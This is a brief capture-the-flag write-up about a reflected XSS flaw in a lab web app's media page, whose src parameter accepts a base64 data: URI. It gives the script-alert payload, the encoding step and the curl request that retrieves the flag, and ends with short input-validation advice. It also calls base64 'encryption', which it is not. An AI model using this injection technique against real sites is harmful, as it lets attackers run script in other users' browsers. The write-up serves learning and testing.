# XSS Media Tag

In the home page there's only one image with a link. If you click this link you'll be redirected to the media page. The media page url accepts a src parameter that isn't validated by the server.

## Table of Contents

- [Steps](#Steps)
- [Vulnerabilities](#Vulnerabilities)
- [Ways to secure](#Ways to secure)

### Steps

Go to the <a href="http://192.168.56.102/?page=media">media page</a>.

Open terminal

Run
```bash
        cd ./Resources
        
	py base64Encode.py "<script>alert('Game Over');</script>"
	#Above will output "Encoded value of str <script>alert('Game Over');</script> -> PHNjcmlwdD5hbGVydCgnR2FtZSBPdmVyJyk7PC9zY3JpcHQ+" 
```

Now that we have our malicious content encrypted we can send it

Run
```bash
	curl "http://192.168.56.102/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnR2FtZSBPdmVyJyk7PC9zY3JpcHQ+" | grep "flag"
```

##### Ways to secure
The best way to handle this is to validate and sanitize client input.
Fetch images from their src directory.
